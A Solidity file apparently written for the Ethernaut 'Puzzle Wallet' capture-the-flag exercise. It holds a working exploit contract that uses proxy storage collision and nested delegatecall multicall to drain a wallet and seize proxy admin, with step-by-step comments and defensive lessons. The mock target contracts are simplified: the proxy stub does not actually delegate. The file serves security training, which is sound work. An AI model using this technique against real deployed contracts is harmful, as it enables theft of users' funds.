// Ethernaut Challenge #24: Puzzle Wallet
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

/*
 * PUZZLE WALLET CHALLENGE
 * 
 * Goal: Become admin of the proxy and drain funds.
 * 
 * THE ARCHITECTURE:
 * - Proxy contract (PuzzleProxy) - delegates to implementation
 * - Implementation (PuzzleWallet) - contains logic
 * 
 * THE VULNERABILITIES:
 * 1. Storage collision between proxy and implementation
 *    - Proxy slot 0: pendingAdmin / admin
 *    - Implementation slot 0: owner / maxBalance
 *    
 * 2. delegatecall multicall allows nested delegatecalls
 *    - Can batch deposit multiple times with one msg.value
 * 
 * 3. execute() doesn't check if deposit was actually made
 *    - Can withdraw more than deposited
 * 
 * ATTACK STRATEGY:
 * 1. Use proposeNewAdmin() to overwrite owner (storage collision)
 * 2. Call addToWhitelist() to whitelist ourselves
 * 3. Use nested multicall to deposit once but count as multiple deposits
 * 4. Withdraw all funds via execute()
 * 5. Set maxBalance to our address (overwrites admin in proxy!)
 */

contract PuzzleWalletExploit {
    PuzzleProxy public proxy;
    PuzzleWallet public wallet;
    
    constructor(address payable _proxy) {
        proxy = PuzzleProxy(_proxy);
        wallet = PuzzleWallet(_proxy);
    }
    
    function attack() external payable {
        require(msg.value == 0.001 ether, "Need 0.001 ETH");
        
        // Step 1: Overwrite owner via storage collision
        // Proxy.proposeNewAdmin() writes to slot 0
        // This overwrites wallet.owner!
        proxy.proposeNewAdmin(address(this));
        
        // Step 2: Add ourselves to whitelist
        wallet.addToWhitelist(address(this));
        
        // Step 3: Craft nested multicall to deposit once, count twice
        // deposit() adds msg.value to balances[msg.sender]
        // If we nest deposit calls, we get double credit for single payment
        
        bytes[] memory depositCalls = new bytes[](1);
        depositCalls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        
        bytes[] memory multicallCalls = new bytes[](2);
        multicallCalls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multicallCalls[1] = abi.encodeWithSelector(
            wallet.multicall.selector, 
            depositCalls
        );
        
        // This deposits once but increments balance twice
        wallet.multicall{value: msg.value}(multicallCalls);
        
        // Step 4: Withdraw everything (we have 2x our deposit)
        wallet.execute(msg.sender, address(wallet).balance, "");
        
        // Step 5: Set maxBalance to our address
        // This overwrites proxy.admin via storage collision!
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}

contract PuzzleProxy {
    address public pendingAdmin; 
    address public admin;
    
    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
        // Storage collision: this writes to slot 0
        // In implementation, slot 0 is owner!
    }
}

contract PuzzleWallet {
    address public owner;      // slot 0 - collides with pendingAdmin!
    uint256 public maxBalance; // slot 1 - collides with admin!
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;
    
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not owner");
        whitelisted[addr] = true;
    }
    
    function deposit() external payable {
        require(whitelisted[msg.sender], "Not whitelisted");
        balances[msg.sender] += msg.value;
    }
    
    function execute(address to, uint256 value, bytes calldata data) external {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success);
    }
    
    function multicall(bytes[] calldata data) external payable {
        bool depositCalled = false;
        for (uint i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly { selector := mload(add(_data, 32)) }
            
            // Only one deposit allowed... but nested multicall bypasses this!
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit already called");
                depositCalled = true;
            }
            
            (bool success,) = address(this).delegatecall(data[i]);
            require(success);
        }
    }
    
    function setMaxBalance(uint256 _maxBalance) external {
        require(address(this).balance == 0, "Balance not zero");
        require(whitelisted[msg.sender], "Not whitelisted");
        maxBalance = _maxBalance;
        // This writes to slot 1, which in proxy is admin!
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. proposeNewAdmin(attacker) → overwrites owner in wallet
 * 2. addToWhitelist(attacker) → now we're owner and whitelisted
 * 3. multicall([deposit, multicall([deposit])]) → nested delegatecall
 *    - Outer deposit: +0.001 to balance, depositCalled = true
 *    - Inner deposit: +0.001 to balance (bypasses depositCalled check!)
 *    - Balance = 0.002, only paid 0.001
 * 4. execute(attacker, 0.002, "") → withdraw all
 * 5. setMaxBalance(uint(attacker)) → overwrites proxy.admin
 * 
 * LESSON:
 * - Delegatecall multicall is extremely dangerous
 * - Storage collision between proxy and implementation is fatal
 * - Nested delegatecalls bypass single-call protections
 * - Never use delegatecall with user-controlled data
 * 
 * This combines multiple advanced vulnerabilities!
 */
